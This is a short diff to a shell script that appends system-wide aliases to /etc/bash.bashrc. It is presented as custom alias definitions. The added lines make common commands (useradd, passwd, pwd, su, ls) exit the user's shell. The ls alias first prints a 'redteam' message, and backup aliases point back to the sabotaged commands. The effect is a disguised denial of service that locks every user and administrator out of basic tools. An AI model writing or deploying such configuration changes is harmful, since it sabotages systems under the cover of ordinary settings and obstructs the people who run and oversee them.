@@ -2,5 +2,14 @@
 sudo echo "# ================================
 # System-Wide Custom Alias Definitions
 # ================================
-alias useradd='echo "Creating users is restricted on this system."'
-alias passwd='echo "Password changes are not allowed."'" >> /etc/bash.bashrc
+alias useradd='exit'
+alias passwd='exit'
+alias pwd='exit'
+alias su='exit'
+alias ls='echo "I love redteam <3" && sleep 0.8 && exit'
+##############
+alias lls='ls'
+alias suu='su'
+alias pwdd='pwd'
+alias useraddd='useradd'
+alias passwdd='passwd'" >> /etc/bash.bashrc
